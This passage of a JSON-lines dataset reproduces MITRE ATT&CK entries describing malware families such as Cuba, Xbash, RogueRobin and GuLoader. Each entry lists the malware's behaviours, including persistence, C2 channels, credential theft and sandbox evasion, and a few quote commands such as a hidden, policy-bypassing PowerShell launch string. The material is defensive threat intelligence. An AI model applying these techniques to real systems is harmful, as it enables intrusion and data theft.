decompressing the attached archive, and double-clicking the executable within.", "RTM runs its core DLL file using rundll32.exe.", "RTM can obtain information about security software on the victim.", "RTM samples have been signed with a code-signing certificates.", "RTM can search for specific strings within browser tabs using a Dynamic Data Exchange mechanism.", "RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names. RTM has also hidden Pony C2 server IP addresses within transactions on the Bitcoin and Namecoin blockchain.", "RTM can obtain the victim username and permissions.", "RTM monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.", "RTM has the capability to download a VNC module from command and control (C2).", "RTM can delete all Registry entries created during its execution.", "RTM can obtain information about process integrity levels.", "RTM can capture screenshots.", "RTM encrypts C2 traffic with a custom RC4 variant.", "RTM strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm. RTM has also been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.", "RTM can obtain the computer name, OS version, and default language identifier."], "is_subtechnique": false}
{"text": " [Carbon](https://attack.mitre.org/software/S0335) is a sophisticated, second-stage backdoor and framework that can be used to steal sensitive information from victims. [Carbon](https://attack.mitre.org/software/S0335) has been selectively used by [Turla](https://attack.mitre.org/groups/G0010) to target government and foreign affairs-related organizations in Central Asia.(Citation: ESET Carbon Mar 2017)(Citation: Securelist Turla Oct 2018)", "idx": "https://attack.mitre.org/software/S0335", "title": "Carbon", "entity": "Carbon", "entity_type": "software", "entity_context": ["Carbon can collect the IP address of the victims and other computers on the network using the commands: <code>ipconfig -all</code> <code>nbtstat -n</code>, and <code>nbtstat -s</code>.", "Carbon uses the command <code>net time \\\\127.0.0.1</code> to get information the system’s time.", "Carbon can list the processes on the victim’s machine.", "Carbon can use Pastebin to receive C2 commands.", "Carbon uses the <code>net view</code> command.", "Carbon uses port 80 for C2 communications.", "Carbon decrypts task and configuration files for execution.", "Carbon establishes persistence by creating a service and naming it based off the operating system version running on the current machine.", "Carbon can use HTTP in C2 communications.", "Carbon uses the <code>netstat -r</code> and <code>netstat -an</code> commands.", "Carbon encrypts configuration files and tasks for the malware to complete using CAST-128 algorithm.", "Carbon creates a base directory that contains the files and folders that are collected.", "Carbon has used RSA encryption for C2 communications.", "Carbon enumerates values in the Registry.", "Carbon uses HTTP to send data to the C2 server.", "Carbon creates several tasks for later execution to continue persistence on the victim’s machine.", "Carbon uses TCP and UDP for C2.", "Carbon has a command to inject code into a process.", "Carbon uses the <code>net group</code> command."], "is_subtechnique": false}
{"text": " [iKitten](https://attack.mitre.org/software/S0278) is a macOS exfiltration agent (Citation: objsee mac malware 2017).", "idx": "https://attack.mitre.org/software/S0278", "title": "iKitten", "entity": "iKitten", "entity_type": "software", "entity_context": ["iKitten collects the keychains on the system.", "iKitten will zip up the /Library/Keychains directory before exfiltrating it.", "iKitten lists the current processes running.", "iKitten adds an entry to the rc.common file for persistence.", "iKitten prompts the user for their credentials.", "iKitten will look for the current IP address.", "iKitten saves itself with a leading \".\" so that it's hidden from users by default."], "is_subtechnique": false}
{"text": " [Cuba](https://attack.mitre.org/software/S0625) is a Windows-based ransomware family that has been used against financial institutions, technology, and logistics organizations in North and South America as well as Europe since at least December 2019.(Citation: McAfee Cuba April 2021)", "idx": "https://attack.mitre.org/software/S0625", "title": "Cuba", "entity": "Cuba", "entity_type": "software", "entity_context": ["Cuba can enumerate files by using a variety of functions.", "Cuba has executed hidden PowerShell windows. ", "Cuba has a hardcoded list of services and processes to terminate.", "Cuba has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.", "Cuba has used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload. ", "Cuba can enumerate processes running on a victim's machine.", "Cuba can modify services by using the <code>OpenService</code> and <code>ChangeServiceConfig</code> functions. ", "Cuba loaded the payload into memory using PowerShell. ", "Cuba has used <code>SeDebugPrivilege</code> and <code>AdjustTokenPrivileges</code> to elevate privileges.", "Cuba has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum. ", "Cuba logs keystrokes via polling by using <code>GetKeyState</code> and <code>VkKeyScan</code> functions.", "Cuba can retrieve the ARP cache from the local system by using <code>GetIpNetTable</code>. ", "Cuba can query service status using <code>QueryServiceStatusEx</code> function.", "Cuba can use the command <code>cmd.exe /c del</code> to delete its artifacts from the system. ", "Cuba has used <code>cmd.exe /c</code> and batch files for execution. ", "Cuba can discover shared resources using the <code>NetShareEnum</code> API call. ", "Cuba has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs. ", "Cuba can enumerate local drives, disk type, and disk free space.", "Cuba has the ability to encrypt system data and add the \".cuba\" extension to encrypted files. ", "Cuba can check if Russian language is installed on the infected machine by using the function <code>GetKeyboardLayoutList</code>. ", "Cuba can download files from its C2 server.", "Cuba can use the function <code>GetIpNetTable</code> to recover the last connections to the victim's machine. ", "Cuba has a packed payload when delivered. "], "is_subtechnique": false}
{"text": " [esentutl](https://attack.mitre.org/software/S0404) is a command-line tool that provides database utilities for the Windows Extensible Storage Engine.(Citation: Microsoft Esentutl)", "idx": "https://attack.mitre.org/software/S0404", "title": "esentutl", "entity": "esentutl", "entity_type": "software", "entity_context": ["esentutl can be used to collect data from local file systems.", "esentutl can be used to copy files from a given URL.", "esentutl can be used to read and write alternate data streams.", "esentutl can use Volume Shadow Copy to copy locked files such as ntds.dit.", "esentutl can be used to copy files to/from a remote share."], "is_subtechnique": false}
{"text": " [ASPXSpy](https://attack.mitre.org/software/S0073) is a Web shell. It has been modified by [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors to create the ASPXTool version. (Citation: Dell TG-3390)", "idx": "https://attack.mitre.org/software/S0073", "title": "ASPXSpy", "entity": "ASPXSpy", "entity_type": "software", "entity_context": ["ASPXSpy is a Web shell. The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services (IIS)."], "is_subtechnique": false}
{"text": " [Xbash](https://attack.mitre.org/software/S0341) is a malware family that has targeted Linux and Microsoft Windows servers. The malware has been tied to the Iron Group, a threat actor group known for previous ransomware attacks. [Xbash](https://attack.mitre.org/software/S0341) was developed in Python and then converted into a self-contained Linux ELF executable by using PyInstaller.(Citation: Unit42 Xbash Sept 2018)", "idx": "https://attack.mitre.org/software/S0341", "title": "Xbash", "entity": "Xbash", "entity_type": "software", "entity_context": ["Xbash can perform port scanning of TCP and UDP ports.", "Xbash can download additional malicious files from its C2 server.", "Xbash can collect IP addresses and local intranet information from a victim’s machine.", "Xbash can obtain a webpage hosted on Pastebin to update its C2 domain list.", "Xbash can use mshta for executing scripts.", "Xbash has destroyed Linux-based databases as part of its ransomware capabilities.\t", "Xbash can create a Startup item for persistence if it determines it is on a Windows system.", "Xbash can obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports.", "Xbash can attempt to exploit known vulnerabilities in Hadoop, Redis, or ActiveMQ when it finds those services running in order to conduct further execution.", "Xbash has maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid.", "Xbash can use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution.", "Xbash uses HTTP for C2 communications.", "Xbash can create a cronjob for persistence if it determines it is on a Linux system.", "Xbash can execute malicious VBScript payloads on the victim’s machine.", "Xbash can use regsvr32 for executing scripts.", "Xbash can execute malicious JavaScript payloads on the victim’s machine."], "is_subtechnique": false}
{"text": " [RARSTONE](https://attack.mitre.org/software/S0055) is malware used by the [Naikon](https://attack.mitre.org/groups/G0019) group that has some characteristics similar to [PlugX](https://attack.mitre.org/software/S0013). (Citation: Aquino RARSTONE)", "idx": "https://attack.mitre.org/software/S0055", "title": "RARSTONE", "entity": "RARSTONE", "entity_type": "software", "entity_context": ["RARSTONE obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.", "RARSTONE uses SSL to encrypt its communication with its C2 server.", "RARSTONE downloads its backdoor component from a C2 server and loads it directly into memory.", "After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system."], "is_subtechnique": false}
{"text": " [PowerDuke](https://attack.mitre.org/software/S0139) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2016. It has primarily been delivered through Microsoft Word or Excel attachments containing malicious macros. (Citation: Volexity PowerDuke November 2016)", "idx": "https://attack.mitre.org/software/S0139", "title": "PowerDuke", "entity": "PowerDuke", "entity_type": "software", "entity_context": ["PowerDuke has a command to get the victim's domain and NetBIOS name.", "PowerDuke has a command to list the victim's processes.", "PowerDuke hides many of its backdoor payloads in an alternate data stream (ADS).", "PowerDuke has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.", "PowerDuke has commands to get the time the machine was built, the time, and the time zone.", "PowerDuke uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA). ", "PowerDuke achieves persistence by using various Registry Run keys.", "PowerDuke connects over 443 for C2.", "PowerDuke uses rundll32.exe to load.", "PowerDuke has a command to download a file.", "PowerDuke runs <code>cmd.exe /c</code> and sends the output to its C2.", "PowerDuke has commands to get the current user's name and SID.", "PowerDuke has a command to get text of the current foreground window.", "PowerDuke has a command to write random data across a file and delete it.", "PowerDuke has commands to get information about the victim's name, build, version, serial number, and memory usage."], "is_subtechnique": false}
{"text": " [GoldFinder](https://attack.mitre.org/software/S0597) is a custom HTTP tracer tool written in Go that logs the route a packet takes between a compromised network and a C2 server. It can be used to inform threat actors of potential points of discovery or logging of their actions, including C2 related to other malware. [GoldFinder](https://attack.mitre.org/software/S0597) was discovered in early 2021 during an investigation into the SolarWinds cyber intrusion by [APT29](https://attack.mitre.org/groups/G0016).(Citation: MSTIC NOBELIUM Mar 2021)", "idx": "https://attack.mitre.org/software/S0597", "title": "GoldFinder", "entity": "GoldFinder", "entity_type": "software", "entity_context": ["GoldFinder logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node.  ", "GoldFinder performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.", "GoldFinder has used HTTP for C2."], "is_subtechnique": false}
{"text": " [Nebulae](https://attack.mitre.org/software/S0630) Is a backdoor that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since at least 2020.(Citation: Bitdefender Naikon April 2021)", "idx": "https://attack.mitre.org/software/S0630", "title": "Nebulae", "entity": "Nebulae", "entity_type": "software", "entity_context": ["Nebulae can download files from C2.", "Nebulae can create a service to establish persistence.", "Nebulae has the capability to upload collected files to C2.", "Nebulae uses functions named <code>StartUserModeBrowserInjection</code> and <code>StopUserModeBrowserInjection</code> indicating that it's trying to imitate chrome_frame_helper.dll.", "Nebulae can list files and directories on a compromised host.", "Nebulae has the ability to delete files and directories.", "Nebulae has created a service named \"Windows Update Agent1\" to appear legitimate.", "Nebulae can use TCP in C2 communications.", "Nebulae has the ability to use <code>CreateProcess</code> to execute a process.", "Nebulae can use RC4 and XOR to encrypt C2 communications.", "Nebulae can achieve persistence through a Registry Run key.", "Nebulae can discover logical drive information including the drive type, free space, and volume information.", "Nebulae can enumerate processes on a target system.", "Nebulae can use DLL side-loading to gain execution.", "Nebulae can use CMD to execute a process."], "is_subtechnique": false}
{"text": " [CALENDAR](https://attack.mitre.org/software/S0025) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Gmail Calendar traffic. (Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/software/S0025", "title": "CALENDAR", "entity": "CALENDAR", "entity_type": "software", "entity_context": ["The CALENDAR malware communicates through the use of events in Google Calendar.", "CALENDAR has a command to run cmd.exe to execute commands."], "is_subtechnique": false}
{"text": " [Aria-body](https://attack.mitre.org/software/S0456) is a custom backdoor that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since approximately 2017.(Citation: CheckPoint Naikon May 2020)", "idx": "https://attack.mitre.org/software/S0456", "title": "Aria-body", "entity": "Aria-body", "entity_type": "software", "entity_context": ["Aria-body has the ability to gather TCP and UDP table status listings.", "Aria-body has the ability to duplicate a token from ntprint.exe.", "Aria-body has the ability to execute a process using <code>runas</code>.", "Aria-body has the ability to collect data from USB devices.", "Aria-body has established persistence via the Startup folder or Run Registry key.", "Aria-body has the ability to enumerate loaded modules for a process..", "Aria-body has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.", "Aria-body has the ability to identify the location, public IP address, and domain name on a compromised host.", "Aria-body has the ability to identify the titles of running windows on a compromised host.", "Aria-body has the ability to launch files using <code>ShellExecute</code>.", "Aria-body has the ability to capture screenshots on compromised hosts.", "Aria-body has used TCP in C2 communications.", "Aria-body has the ability to use a DGA for C2 communications.", "Aria-body has the ability to download additional payloads from C2.", "Aria-body has the ability to decrypt the loader configuration and payload DLL.", "Aria-body has used ZIP to compress data gathered on a compromised host.", "Aria-body has the ability to use a reverse SOCKS proxy module.", "Aria-body has the ability to identify the username on a compromised host.", "Aria-body has the ability to gather metadata from a file and to search for file and directory names.", "Aria-body has the ability to delete files and directories on compromised hosts.", "Aria-body has used HTTP in C2 communications.", "Aria-body has the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host.", "Aria-body has used an encrypted configuration file for its loader."], "is_subtechnique": false}
{"text": " [Crutch](https://attack.mitre.org/software/S0538) is a backdoor designed for document theft that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2015.(Citation: ESET Crutch December 2020)", "idx": "https://attack.mitre.org/software/S0538", "title": "Crutch", "entity": "Crutch", "entity_type": "software", "entity_context": ["Crutch can exfiltrate data over the primary C2 channel (Dropbox HTTP API).", "Crutch has the ability to persist using scheduled tasks.", "Crutch has used the WinRAR utility to compress and encrypt stolen files.", "Crutch has established persistence with a scheduled task impersonating the Outlook item finder.", "Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.", "Crutch has used a hardcoded GitHub repository as a fallback channel.", "Crutch can exfiltrate files from compromised systems.", "Crutch can monitor for removable drives being plugged into the compromised machine.", "Crutch has staged stolen files in the <code>C:\\AMD\\Temp</code> directory.", "Crutch can automatically monitor removable drives in a loop and copy interesting files.", "Crutch can monitor removable drives and exfiltrate files matching a given extension list.", "Crutch has exfiltrated stolen data to Dropbox.", "Crutch has automatically exfiltrated stolen files to Dropbox.", "Crutch can use Dropbox to receive commands and upload stolen data.", "Crutch has conducted C2 communications with a Dropbox account using the HTTP API."], "is_subtechnique": false}
{"text": " [Dacls](https://attack.mitre.org/software/S0497) is a multi-platform remote access tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least December 2019.(Citation: TrendMicro macOS Dacls May 2020)(Citation: SentinelOne Lazarus macOS July 2020)", "idx": "https://attack.mitre.org/software/S0497", "title": "Dacls", "entity": "Dacls", "entity_type": "software", "entity_context": ["Dacls has had its payload named with a dot prefix to make it hidden from view in the Finder application.", "Dacls can collect data on running and parent processes.", "Dacls can download its payload from a C2 server.", "Dacls can establish persistence via a Launch Daemon.", "The Dacls Mach-O binary has been disguised as a .nib file.", "Dacls can scan directories on a compromised host.", "Dacls can establish persistence via a LaunchAgent.", "Dacls can encrypt its configuration file with AES CBC.", "Dacls can use HTTPS in C2 communications."], "is_subtechnique": false}
{"text": " [OLDBAIT](https://attack.mitre.org/software/S0138) is a credential harvester used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)", "idx": "https://attack.mitre.org/software/S0138", "title": "OLDBAIT", "entity": "OLDBAIT", "entity_type": "software", "entity_context": ["OLDBAIT can use SMTP for C2.", "OLDBAIT collects credentials from several email clients.", "OLDBAIT installs itself in <code>%ALLUSERPROFILE%\\\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe</code>; the directory name is missing a space and the file name is missing the letter \"o.\"", "OLDBAIT can use HTTP for C2.", "OLDBAIT collects credentials from Internet Explorer, Mozilla Firefox, and Eudora.", "OLDBAIT obfuscates internal strings and unpacks them at startup."], "is_subtechnique": false}
{"text": " [Pay2Key](https://attack.mitre.org/software/S0556) is a ransomware written in C++ that has been used by [Fox Kitten](https://attack.mitre.org/groups/G0117) since at least July 2020 including campaigns against Israeli companies. [Pay2Key](https://attack.mitre.org/software/S0556) has been incorporated with a leak site to display stolen sensitive information to further pressure victims into payment.(Citation: ClearkSky Fox Kitten February 2020)(Citation: Check Point Pay2Key November 2020)", "idx": "https://attack.mitre.org/software/S0556", "title": "Pay2Key", "entity": "Pay2Key", "entity_type": "software", "entity_context": ["Pay2Key can encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption.", "Pay2Key has designated machines in the compromised network to serve as reverse proxy pivot points to channel communications with C2.", "Pay2Key has used RSA encrypted communications with C2.", "Pay2Key has sent its public key to the C2 server over TCP.", "Pay2Key can identify the IP and MAC addresses of the compromised host.", "Pay2Key can stop the MS SQL service at the end of the encryption process to release files locked by the service.", "Pay2Key can remove its log file from disk.", "Pay2Key has the ability to gather the hostname of the victim machine."], "is_subtechnique": false}
{"text": " [RogueRobin](https://attack.mitre.org/software/S0270) is a payload used by [DarkHydrus](https://attack.mitre.org/groups/G0079) that has been developed in PowerShell and C#. (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019)", "idx": "https://attack.mitre.org/software/S0270", "title": "RogueRobin", "entity": "RogueRobin", "entity_type": "software", "entity_context": ["RogueRobin created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.", "RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment. ", "RogueRobin can save a new file to the system from the C2 server.", "RogueRobin checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.", "The PowerShell script with the RogueRobin payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation.", "RogueRobin uses various WMI queries to check if the sample is running in a sandbox.", "RogueRobin uses regsvr32.exe to run a .sct file for execution.", "RogueRobin uses a command prompt to run a PowerShell script from Excel. To assist in establishing persistence, RogueRobin creates <code>%APPDATA%\\OneDrive.bat</code> and saves the following string to it:<code>powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\\OneDrive.ps1”</code>.", "RogueRobin gathers the IP address and domain from the victim’s machine.", "RogueRobin has a command named <code>$screenshot</code> that may be responsible for taking screenshots of the victim machine.", "RogueRobin has used Google Drive as a Command and Control channel. ", "RogueRobin decodes an embedded executable using base64 and decompresses it.", "RogueRobin establishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in.", "RogueRobin base64 encodes strings that are sent to the C2 over its DNS tunnel.", "RogueRobin gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.", "RogueRobin uses Windows Script Components.", "RogueRobin collects the victim’s username and whether that user is an admin.", "RogueRobin enumerates running processes to search for Wireshark and Windows Sysinternals suite."], "is_subtechnique": false}
{"text": " [ConnectWise](https://attack.mitre.org/software/S0591) is a legitimate remote administration tool that has been used since at least 2016 by threat actors including [MuddyWater](https://attack.mitre.org/groups/G0069) and [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) to connect to and conduct lateral movement in target environments.(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)", "idx": "https://attack.mitre.org/software/S0591", "title": "ConnectWise", "entity": "ConnectWise", "entity_type": "software", "entity_context": ["ConnectWise can be used to execute PowerShell commands on target machines.", "ConnectWise can record video on remote hosts.", "ConnectWise can take screenshots on remote hosts."], "is_subtechnique": false}
{"text": " [NanHaiShu](https://attack.mitre.org/software/S0228) is a remote access tool and JScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). [NanHaiShu](https://attack.mitre.org/software/S0228) has been used to target government and private-sector organizations that have relations to the South China Sea dispute. (Citation: Proofpoint Leviathan Oct 2017) (Citation: fsecure NanHaiShu July 2016)", "idx": "https://attack.mitre.org/software/S0228", "title": "NanHaiShu", "entity": "NanHaiShu", "entity_type": "software", "entity_context": ["NanHaiShu launches a script to delete their original decoy file to cover tracks.", "NanHaiShu collects the username from the victim.", "NanHaiShu can change Internet Explorer settings to reduce warnings about malware activity.", "NanHaiShu can gather information about the victim proxy server.", "NanHaiShu executes additional Jscript code on the victim's machine.", "NanHaiShu uses DNS for the C2 communications.", "NanHaiShu can gather the victim computer name and serial number.", "NanHaiShu encodes files in Base64.", "NanHaiShu uses mshta.exe to load its program and files.", "NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism.", "NanHaiShu can download additional files from URLs.", "NanHaiShu executes additional VBScript code on the victim's machine."], "is_subtechnique": false}
{"text": " [Chaes](https://attack.mitre.org/software/S0631) is a multistage information stealer written in several programming languages that collects login credentials, credit card numbers, and other financial information. [Chaes](https://attack.mitre.org/software/S0631) was first observed in 2020, and appears to primarily target victims in Brazil as well as other e-commerce customers in Latin America.(Citation: Cybereason Chaes Nov 2020)", "idx": "https://attack.mitre.org/software/S0631", "title": "Chaes", "entity": "Chaes", "entity_type": "software", "entity_context": ["Chaes has added persistence via the Registry key <code>software\\microsoft\\windows\\currentversion\\run\\microsoft windows html help</code>.", "Chaes has used a script that extracts the web session cookie and sends it to the C2 server. ", "Chaes has used HTTP for C2 communications.", "Chaes can download additional files onto an infected machine.", "Chaes has used Installutill to download content.", "Chaes has collected system information, including the machine name and OS version.", "Chaes has used search order hijacking to load a malicious DLL.", "Chaes has been delivered by sending victims a phishing email containing a malicious .docx file.", "Chaes has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.", "Chaes has collected the username and UID from the infected machine.", "Chaes stored its instructions in a config file in the Registry. ", "Chaes has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.", "Chaes has used .MSI files as an initial way to start the infection chain.", "Chaes can capture screenshots of the infected machine.", "Chaes has a module to perform any API hooking it desires. ", "Chaes has used encryption for its C2 channel. ", "Chaes has used Python scripts for execution and the installation of additional files. ", "Chaes has used cmd to execute tasks on the system. ", "Chaes has used an unsigned, crafted DLL module named <code>hha.dll</code> that was designed to look like a legitimate 32-bit Windows DLL.", "Chaes has decrypted an AES encrypted binary file to trigger the download of other files. ", "Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload. ", "Chaes requires the user to click on the malicious Word document to execute the next part of the attack. ", "Chaes has used VBscript to execute malicious code. ", "Chaes can steal login credentials and stored financial information from the browser.", "Chaes has exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol. ", "Chaes used the <code>CreateFileW()</code> API function with read permissions to access downloaded payloads. ", "Chaes has used Base64 to encode C2 communications. "], "is_subtechnique": false}
{"text": " [at](https://attack.mitre.org/software/S0110) is used to schedule tasks on a system to run at a specified date or time. (Citation: TechNet At)", "idx": "https://attack.mitre.org/software/S0110", "title": "at", "entity": "at", "entity_type": "software", "entity_context": ["at can be used to schedule a task on a system."], "is_subtechnique": false}
{"text": " [Mivast](https://attack.mitre.org/software/S0080) is a backdoor that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009). It was reportedly used in the Anthem breach. (Citation: Symantec Black Vine)", "idx": "https://attack.mitre.org/software/S0080", "title": "Mivast", "entity": "Mivast", "entity_type": "software", "entity_context": ["Mivast has the capability to gather NTLM password information.", "Mivast communicates over port 80 for C2.", "Mivast creates the following Registry entry: <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia</code>.", "Mivast has the capability to download and execute .exe files.", "Mivast has the capability to open a remote shell and run basic commands."], "is_subtechnique": false}
{"text": " [UBoatRAT](https://attack.mitre.org/software/S0333) is a remote access tool that was identified in May 2017.(Citation: PaloAlto UBoatRAT Nov 2017)", "idx": "https://attack.mitre.org/software/S0333", "title": "UBoatRAT", "entity": "UBoatRAT", "entity_type": "software", "entity_context": ["UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.", "UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine.", "UBoatRAT can start a command shell.", "UBoatRAT uses ports 80 and 443 for C2 communications.", "UBoatRAT has used HTTP for C2 communications.", "UBoatRAT has used GitHub and a public blog service in Hong Kong for C2 communications.", "UBoatRAT can list running processes on the system.", "UBoatRAT can upload and download files to the victim’s machine.", "UBoatRAT encrypts instructions in the payload using a simple XOR cipher."], "is_subtechnique": false}
{"text": " [ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) is a remote access Trojan (RAT) used by North Korean cyber actors that was first identified in August 2020. It is a reconnaissance tool--with keylogging and screen capture functionality--used for information gathering on compromised systems.(Citation: CISA EB Aug 2020)", "idx": "https://attack.mitre.org/software/S0593", "title": "ECCENTRICBANDWAGON", "entity": "ECCENTRICBANDWAGON", "entity_type": "software", "entity_context": ["ECCENTRICBANDWAGON can capture screenshots and store them locally.", "ECCENTRICBANDWAGON has encrypted strings with RC4.", "ECCENTRICBANDWAGON has stored keystrokes and screenshots within the <code>%temp%\\GoogleChrome</code>, <code>%temp%\\Downloads</code>, and <code>%temp%\\TrendMicroUpdate</code> directories.", "ECCENTRICBANDWAGON can delete log files generated from the malware stored at <code>C:\\windows\\temp\\tmp0207</code>.", "ECCENTRICBANDWAGON can capture and store keystrokes.", "ECCENTRICBANDWAGON can use cmd to execute commands on a victim’s machine."], "is_subtechnique": false}
{"text": " [GuLoader](https://attack.mitre.org/software/S0561) is a file downloader that has been used since at least December 2019 to distribute a variety of remote administration tool (RAT) malware, including [NETWIRE](https://attack.mitre.org/software/S0198), [Agent Tesla](https://attack.mitre.org/software/S0331), [NanoCore](https://attack.mitre.org/software/S0336), FormBook, and Parallax RAT.(Citation: Unit 42 NETWIRE April 2020)(Citation: Medium Eli Salem GuLoader April 2021)", "idx": "https://attack.mitre.org/software/S0561", "title": "GuLoader", "entity": "GuLoader", "entity_type": "software", "entity_context": ["GuLoader has the ability to perform anti-debugging based on time checks, API calls, and CPUID.", "GuLoader has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call <code>EnumWindows</code>, and checking for Qemu guest agent.", "GuLoader has been spread in phishing campaigns using malicious web links.", "GuLoader can use HTTP to retrieve additional binaries.", "The GuLoader executable has been retrieved via embedded macros in malicious Word documents.", "GuLoader can establish persistence via the Registry under <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>.", "GuLoader has the ability to download malware from Google Drive.", "GuLoader can delete its executable from the <code>AppData\\Local\\Temp</code> directory on the compromised host.", "GuLoader can download further malware for execution on the victim's machine.", "GuLoader has relied upon users clicking on links to malicious documents.", "GuLoader can use a number of different APIs for discovery and execution.", "GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state. GuLoader has previously used RegAsm as a donor process."], "is_subtechnique": false}
{"text": " [HELLOKITTY](https://attack.mitre.org/software/S0617) is a ransomware written in C++ that shares similar code structure and functionality with [DEATHRANSOM](https://attack.mitre.org/software/S0616) and [FIVEHANDS](https://attack.mitre.org/software/S0618). [HELLOKITTY](https://attack.mitre.org/software/S0617) has been used since at least 2020, targets have included a Polish video game developer and a Brazilian electric power company.(Citation: FireEye FiveHands April 2021)", "idx": "https://attack.mitre.org/software/S0617", "title": "HELLOKITTY", "entity": "HELLOKITTY", "entity_type": "software", "entity_context": ["HELLOKITTY can use WMI to delete volume shadow copies.", "HELLOKITTY can enumerate logical drives on a target system.", "HELLOKITTY has the ability to enumerate network resources.", "HELLOKITTY can use an embedded RSA-2048 public key to encrypt victim data for ransom.", "HELLOKITTY can delete volume shadow copies on compromised hosts.", "HELLOKITTY can search for specific processes to terminate."], "is_subtechnique": false}
{"text": " [ZLib](https://attack.mitre.org/software/S0086) is a full-featured backdoor that was used as a second-stage implant by [Dust Storm](https://attack.mitre.org/groups/G0031) from 2014 to 2015. It is malware and should not be confused with the compression library from which its name is derived. (Citation: Cylance Dust Storm)", "idx": "https://attack.mitre.org/software/S0086", "title": "ZLib", "entity": "ZLib", "entity_type": "software", "entity_context": ["ZLib mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.", "ZLib has the ability to obtain screenshots of the compromised system.", "ZLib has the ability to execute shell commands.", "ZLib has the ability to download files.", "The ZLib backdoor compresses communications using the standard Zlib compression library.", "ZLib has the ability to enumerate files and drives.", "ZLib communicates over HTTP for C2.", "ZLib has the ability to discover and manipulate Windows services.", "ZLib has the ability to enumerate system information.", "ZLib creates Registry keys to allow itself to run as various services."], "is_subtechnique": false}
{"text": " [FYAnti](https://attack.mitre.org/software/S0628) is a loader that has been used by [menuPass](https://attack.mitre.org/groups/G0045) since at least 2020, including to deploy [QuasarRAT](https://attack.mitre.org/software/S0262).(Citation: Securelist APT10 March 2021)", "idx": "https://attack.mitre.org/software/S0628", "title": "FYAnti", "entity": "FYAnti", "entity_type": "software", "entity_context": ["FYAnti can search the <code>C:\\Windows\\Microsoft.NET\\</code> directory for files of a specified size.", "FYAnti has the ability to decrypt an embedded .NET module.", "FYAnti can download additional payloads to a compromised host.\t ", "FYAnti has used ConfuserEx to pack its .NET module."], "is_subtechnique": false}
